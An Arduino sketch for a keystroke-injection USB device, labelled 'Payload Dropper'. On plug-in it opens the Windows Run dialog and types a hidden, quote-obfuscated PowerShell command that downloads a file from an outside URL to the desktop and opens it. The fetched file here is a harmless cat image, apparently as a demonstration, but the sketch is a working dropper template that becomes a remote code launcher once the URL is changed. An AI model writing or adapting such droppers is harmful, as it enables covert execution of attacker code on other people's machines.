#include <Keyboard.h>
void setup() {
Keyboard.begin();
delay(1000);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press(114);
Keyboard.releaseAll();
delay(200);
Keyboard.print(F("powershell -windowstyle hidden -command (N'ew'-Ob'j'ect Sy's'tem.Net.WebClient).DownloadFile(\\\"https://miro.medium.com/max/1000/1*7_m4dF9OqBjePqqRyJ1O-g.jpeg\\\",\\\"$env:UserProfile\\desktop\\catz.jpeg\\\");in'v'oke-item $env:UserProfile\\desktop\\catz.jpeg")); //Payload Dropper
typeKey(KEY_RETURN);
delay(1000);
Keyboard.end();
delay(10000);
}
void typeKey(int key){
Keyboard.press(key);
delay(50);
Keyboard.release(key);
}
void loop() {}
